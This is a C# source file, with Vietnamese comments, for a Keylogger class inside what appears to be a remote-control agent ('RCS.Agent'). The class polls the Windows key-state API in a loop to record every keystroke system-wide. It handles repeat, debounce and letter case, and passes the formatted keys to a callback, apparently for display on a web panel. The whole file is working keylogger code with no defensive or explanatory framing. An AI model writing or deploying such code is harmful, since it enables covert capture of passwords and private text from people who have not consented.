using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms; // Cần cho Keys enum

namespace RCS.Agent.Services.Windows
{
    public class Keylogger
    {
        private CancellationTokenSource _cts;
        private Action<string> _onKeyPressed;

        // Import hàm API
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        // Lưu trạng thái phím trước đó (True = Đang nhấn, False = Đã nhả)
        private readonly bool[] _prevKeyStates = new bool[256];
        
        // Lưu thời gian lần cuối gửi phím để xử lý việc giữ phím (Repeat)
        private readonly DateTime[] _lastPressTimes = new DateTime[256];

        // Lưu thời gian lần cuối nhả phím để xử lý chống nảy (Debounce)
        private readonly DateTime[] _lastReleaseTimes = new DateTime[256];
        
        // --- CẤU HÌNH ĐỘ TRỄ ---
        private const int REPEAT_DELAY_MS = 600; // Tăng lên 600ms: Chờ lâu hơn chút mới bắt đầu lặp
        private const int REPEAT_INTERVAL_MS = 200; // Tăng lên 200ms: Tốc độ lặp chậm lại để dễ nhìn
        private const int DEBOUNCE_TIME_MS = 50; // Khoảng thời gian bỏ qua nếu phím nảy (Double typing fix)

        public void Start(Action<string> onKeyPressed)
        {
            if (_cts != null) return;
            _cts = new CancellationTokenSource();
            _onKeyPressed = onKeyPressed;

            // Reset trạng thái mảng khi bắt đầu
            Array.Clear(_prevKeyStates, 0, _prevKeyStates.Length);
            Array.Clear(_lastPressTimes, 0, _lastPressTimes.Length);
            Array.Clear(_lastReleaseTimes, 0, _lastReleaseTimes.Length);

            Task.Run(async () => await RealKeylogLoop(_cts.Token));
        }

        public void Stop()
        {
            _cts?.Cancel();
            _cts = null;
        }

        private async Task RealKeylogLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                // Quét qua bảng mã ASCII (từ 8 đến 255)
                for (int i = 8; i < 256; i++)
                {
                    // Bit cao nhất là 1 nghĩa là phím đang được giữ xuống
                    bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
                    bool wasDown = _prevKeyStates[i];
                    var now = DateTime.Now;

                    if (isDown)
                    {
                        // TRƯỜNG HỢP 1: Nhấn mới (Chuyển từ Nhả -> Nhấn)
                        if (!wasDown)
                        {
                            // DEBOUNCE: Kiểm tra xem lần nhả phím trước đó có quá gần không?
                            double msSinceRelease = (now - _lastReleaseTimes[i]).TotalMilliseconds;
                            
                            if (msSinceRelease > DEBOUNCE_TIME_MS)
                            {
                                ProcessKey(i);
                            // QUAN TRỌNG: Luôn reset bộ đếm Repeat khi phát hiện nhấn mới (kể cả do nảy phím)
                            // Việc này ngăn chặn vòng lặp sau hiểu nhầm là đang "Hold" phím từ lâu      
                                _lastPressTimes[i] = now.AddMilliseconds(REPEAT_DELAY_MS);
                            }
                            else {
                                // Bỏ qua lần nhấn này do nằm trong khoảng Debounce
                            }
       }
                        // TRƯỜNG HỢP 2: Đang giữ phím (Hold)
                        else if (wasDown && now >= _lastPressTimes[i])
                        {
                            // Đã vượt qua thời gian chờ, kích hoạt lặp lại
                            ProcessKey(i);
                            // Đặt delay cho lần lặp tiếp theo
                            _lastPressTimes[i] = now.AddMilliseconds(REPEAT_INTERVAL_MS); 
                        }

                        _prevKeyStates[i] = true;
                    }
                    else
                    {
                        // Nếu phím vừa được nhả ra, ghi lại thời gian nhả để tính Debounce cho lần nhấn sau
                        if (wasDown)
                        {
                            _lastReleaseTimes[i] = now;
                        }
                        _prevKeyStates[i] = false;
                    }
                }

                // Delay ngắn để vòng lặp không chiếm 100% CPU nhưng vẫn đủ nhanh để bắt phím
                await Task.Delay(20, token);
            }
        }

        private void ProcessKey(int vKey)
        {
            string keyStr = "";
            Keys key = (Keys)vKey;

            // Bỏ qua các phím chuột
            if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) return;

            // Xử lý các phím đặc biệt để hiển thị đẹp hơn trên Web
            if (key == Keys.Enter) keyStr = "\n[ENTER]\n";
            else if (key == Keys.Space) keyStr = " ";
            else if (key == Keys.Back) keyStr = "[BACK]";
            else if (key == Keys.Tab) keyStr = "[TAB]";
            else if (key == Keys.LShiftKey || key == Keys.RShiftKey || key == Keys.ShiftKey || 
                     key == Keys.LControlKey || key == Keys.RControlKey || key == Keys.ControlKey ||
                     key == Keys.LMenu || key == Keys.RMenu || key == Keys.Menu) 
            {
                // Không in các phím bổ trợ khi đứng một mình
                return; 
            }
            else if (key.ToString().Length == 1)
            {
                // Xử lý viết hoa/thường
                bool shift = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                bool caps = (GetKeyState((int)Keys.CapsLock) & 1) != 0;
                
                if (key >= Keys.A && key <= Keys.Z)
                {
                    if (shift ^ caps) keyStr = key.ToString().ToUpper();
                    else keyStr = key.ToString().ToLower();
                }
                else if (key >= Keys.D0 && key <= Keys.D9)
                {
                     // Lấy số (Bỏ chữ D ở đầu, ví dụ D1 -> 1)
                     keyStr = key.ToString().Replace("D", "");
                }
                else
                {
                    keyStr = key.ToString();
                }
            }
            else
            {
                keyStr = $"[{key}]";
            }

            if (!string.IsNullOrEmpty(keyStr))
            {
                _onKeyPressed?.Invoke(keyStr);
            }
        }
    }
}